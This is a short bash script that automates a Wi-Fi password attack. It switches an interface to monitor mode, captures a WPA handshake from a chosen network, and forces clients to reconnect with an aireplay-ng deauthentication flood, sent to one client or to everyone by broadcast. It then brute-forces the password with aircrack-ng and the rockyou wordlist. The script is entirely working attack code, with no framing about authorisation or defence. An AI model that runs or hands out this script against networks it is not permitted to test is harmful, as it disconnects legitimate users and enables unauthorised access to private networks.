#!/bin/bash

WIFI_INTERFACE="wlan1"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Putting Wi-Fi into monitor mode..."
sudo ifconfig $WIFI_INTERFACE down
sudo iwconfig $WIFI_INTERFACE mode monitor
sudo ifconfig $WIFI_INTERFACE up

echo "[*] Scanning for Wi-Fi networks (press CTRL+C when you find the target)..."
sudo airodump-ng $WIFI_INTERFACE

echo
read -p "Enter Target BSSID (MAC Address): " BSSID
read -p "Enter Target Channel: " CHANNEL
read -p "Enter File Prefix for Capture: " FILEPREFIX

echo "[*] Capturing handshake for $BSSID on channel $CHANNEL..."
sudo airodump-ng --bssid $BSSID --channel $CHANNEL --write $FILEPREFIX $WIFI_INTERFACE

echo "[*] Deauthentication attack to force handshake capture (press CTRL+C after handshake appears)..."
read -p "Enter Target Client MAC Address (or press ENTER for broadcast): " CLIENT

if [ -z "$CLIENT" ]; then
  sudo aireplay-ng --deauth 10 -a $BSSID $WIFI_INTERFACE
else
  sudo aireplay-ng --deauth 10 -a $BSSID -c $CLIENT $WIFI_INTERFACE
fi

echo "[*] Cracking password with $WORDLIST..."
sudo aircrack-ng -w $WORDLIST -b $BSSID ${FILEPREFIX}-01.cap

echo "[*] Done!"
